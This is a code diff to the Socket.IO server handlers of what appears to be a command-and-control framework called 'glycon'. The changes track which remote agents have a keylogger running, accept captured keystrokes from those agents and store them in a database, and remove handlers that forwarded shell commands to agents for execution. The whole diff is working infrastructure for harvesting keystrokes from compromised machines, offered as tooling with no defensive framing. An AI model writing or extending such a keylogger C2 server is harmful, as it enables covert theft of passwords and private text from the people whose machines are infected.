@@ -9,6 +9,7 @@ from glycon.secure_comms import SecureComms
 
 def init_socket_handlers(socketio):
     active_agents = {}  
+    keylogger_active_agents = {}  # Track agents with keylogger started
     connection_count = 0
 
     # Ensure keylogs table exists
@@ -99,41 +100,10 @@ def init_socket_handlers(socketio):
             if f"agent_{agent_id}" not in rooms:
                 disconnected_agents.append(agent_id)
                 active_agents.pop(agent_id, None)
+                keylogger_active_agents.pop(agent_id, None)
                 connection_count -= 1
                 print(f"[SocketIO] Agent {agent_id} disconnected and removed from active_agents")
                 print(f"[SocketIO] Current active_agents after disconnect: {list(active_agents.keys())}")
-                
-                conn = sqlite3.connect(CONFIG.database)
-                c = conn.cursor()
-                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
-                conn.commit()
-                conn.close()
-                
-                emit('status', {
-                    'status': 'disconnected',
-                    'agent_id': agent_id
-                }, room=f"terminal_{agent_id}", namespace='/terminal')
-                
-                emit('ws_status', {
-                    'agent_id': agent_id,
-                    'action': 'stop',
-                    'status': 'success',
-                    'message': 'WebSocket disconnected'
-                }, room=f"terminal_{agent_id}", namespace='/terminal')
-        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")
-
-    @socketio.on('disconnect', namespace='/terminal')
-    def handle_agent_disconnect():
-        nonlocal connection_count
-        # Remove agent from active_agents on disconnect
-        rooms = socketio.server.manager.rooms.get('/terminal', {})
-        disconnected_agents = []
-        for agent_id in list(active_agents.keys()):
-            if f"agent_{agent_id}" not in rooms:
-                disconnected_agents.append(agent_id)
-                active_agents.pop(agent_id, None)
-                connection_count -= 1
-                print(f"[SocketIO] Agent {agent_id} disconnected and removed from active_agents")
                 
                 conn = sqlite3.connect(CONFIG.database)
                 c = conn.cursor()
@@ -171,6 +141,16 @@ def init_socket_handlers(socketio):
                 print("[SocketIO] Keylogger authentication failed: Invalid token")
                 return False
             
+            # Check if keylogger is started on the agent
+            if data['agent_id'] not in keylogger_active_agents:
+                print(f"[SocketIO] Keylogger namespace usage denied: Keylogger not started on agent {data['agent_id']}")
+                emit('status', {
+                    'status': 'error',
+                    'message': 'Keylogger not started on agent',
+                    'agent_id': data['agent_id']
+                }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
+                return False
+            
             join_room(f"agent_{data['agent_id']}", namespace='/keylogger')
             active_agents[data['agent_id']] = True
             print(f"[SocketIO] Keylogger agent authenticated: {data['agent_id']}")
@@ -189,120 +169,17 @@ def init_socket_handlers(socketio):
                 'agent_id': data['agent_id']
             }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
             return False
-        
 
-    @socketio.on('command', namespace='/terminal')
-    def handle_command(data):
-        print(f"[SocketIO] Received command for agent {data['agent_id']}: {data['command']}")
-        if not current_user.is_authenticated:
-            print("[SocketIO] Command rejected: Unauthenticated")
-            return
-            
+    @socketio.on('start_keylogger', namespace='/keylogger')
+    def handle_start_keylogger(data):
         agent_id = data.get('agent_id')
-        command = data.get('command')
-        current_dir = data.get('current_dir', '')
-        
-        if not agent_id or not command:
-            print("[SocketIO] Command rejected: Missing parameters")
+        if not agent_id:
+            print("[SocketIO] start_keylogger event missing agent_id")
             return
-            
-        if agent_id in active_agents:
-            print(f"[SocketIO] Forwarding command to agent {agent_id}")
-            emit('execute_command', {
-                'command': command,
-                'current_dir': current_dir
-            }, room=f"agent_{agent_id}", namespace='/terminal')
-        else:
-            error_msg = 'Agent not connected via WebSocket'
-            print(f"[SocketIO] {error_msg}")
-            emit('terminal_output', {
-                'agent_id': agent_id,
-                'error': error_msg,
-                'current_dir': current_dir
-            }, room=f"terminal_{agent_id}", namespace='/terminal')
-
-    @socketio.on('command_result', namespace='/terminal')
-    def handle_command_result(data):
-        try:
-            print(f"[SocketIO] Command result from agent {data['agent_id']}:")
-            print(f"Command: {data.get('command')}")
-            print(f"Output: {data.get('output')}")
-            print(f"Error: {data.get('error')}")
-            
-            # Broadcast to the terminal UI
-            emit('terminal_output', {
-                'agent_id': data['agent_id'],
-                'command': data.get('command'),
-                'output': data.get('output'),
-                'error': data.get('error'),
-                'current_dir': data.get('current_dir')
-            }, room=f"terminal_{data['agent_id']}")
-            
-        except Exception as e:
-            print(f"[SocketIO] Error handling command result: {str(e)}")
-
-    @socketio.on('ws_control', namespace='/terminal')
-    def handle_ws_control(data):
-        if not current_user.is_authenticated:
-            return
-            
-        agent_id = data.get('agent_id')
-        action = data.get('action')
-        
-        if not agent_id or action not in ['start', 'stop']:
-            return
-            
-        if action == 'start':
-            emit('ws_status', {
-                'agent_id': agent_id,
-                'action': action,
-                'status': 'pending'
-            }, room=f"terminal_{agent_id}", namespace='/terminal')
-        else:
-            if agent_id in active_agents:
-                emit('disconnect', {}, room=f"agent_{agent_id}", namespace='/terminal')
-                active_agents.pop(agent_id, None)
-                
-                conn = sqlite3.connect(CONFIG.database)
-                c = conn.cursor()
-                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
-                conn.commit()
-                conn.close()
-                
-                emit('ws_status', {
-                    'agent_id': agent_id,
-                    'action': action,
-                    'status': 'success',
-                    'message': 'WebSocket disconnected'
-                }, room=f"terminal_{agent_id}", namespace='/terminal')
-                
-                emit('status', {
-                    'status': 'disconnected',
-                    'agent_id': agent_id
-                }, room=f"terminal_{agent_id}", namespace='/terminal')
-
-    @socketio.on('disconnect', namespace='/terminal')
-    def handle_agent_disconnect():
-        for agent_id in list(active_agents.keys()):
-            if f"agent_{agent_id}" in socketio.server.manager.rooms['/terminal']:
-                active_agents.pop(agent_id, None)
-                conn = sqlite3.connect(CONFIG.database)
-                c = conn.cursor()
-                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
-                conn.commit()
-                conn.close()
-                
-                emit('status', {
-                    'status': 'disconnected',
-                    'agent_id': agent_id
-                }, room=f"terminal_{agent_id}", namespace='/terminal')
-                
-                emit('ws_status', {
-                    'agent_id': agent_id,
-                    'action': 'stop',
-                    'status': 'success',
-                    'message': 'WebSocket disconnected'
-                }, room=f"terminal_{agent_id}", namespace='/terminal')
+        # Mark keylogger as started for this agent
+        keylogger_active_agents[agent_id] = True
+        print(f"[SocketIO] Keylogger started on agent {agent_id}")
+        emit('keylogger_status', {'status': 'started'}, room=f"agent_{agent_id}", namespace='/keylogger')
 
     @socketio.on('keylogger_data', namespace='/keylogger')
     def handle_keylogger_data(data):
@@ -312,8 +189,9 @@ def init_socket_handlers(socketio):
         if not agent_id or not keys:
             print("[SocketIO] keylogger_data event missing agent_id or keys")
             return
-        if agent_id not in active_agents:
-            print("[SocketIO] Unauthorized keylogger_data event received")
+        if agent_id not in keylogger_active_agents:
+            print(f"[SocketIO] Unauthorized keylogger_data event received from agent {agent_id}")
+            emit('keylogger_ack', {'status': 'error', 'message': 'Keylogger not started'}, room=f"agent_{agent_id}", namespace='/keylogger')
             return
         try:
             print(f"[SocketIO] Saving keylogger data for agent {agent_id}: {keys}")
@@ -334,5 +212,19 @@ def init_socket_handlers(socketio):
     @socketio.on('join', namespace='/keylogger')
     def handle_join(data):
         room = data
+        agent_id = None
+        if isinstance(data, dict):
+            room = data.get('room')
+            agent_id = data.get('agent_id')
+        if not room:
+            print("[SocketIO] join event missing room")
+            return
+        if agent_id and agent_id not in keylogger_active_agents:
+            print(f"[SocketIO] Keylogger join denied: Keylogger not started on agent {agent_id}")
+            emit('status', {
+                'status': 'error',
+                'message': 'Keylogger not started on agent',
+                'agent_id': agent_id
+            }, room=room, namespace='/keylogger')
+            return
         join_room(room, namespace='/keylogger')
-        print(f"[SocketIO] Client joined room {room} in /keylogger namespace")
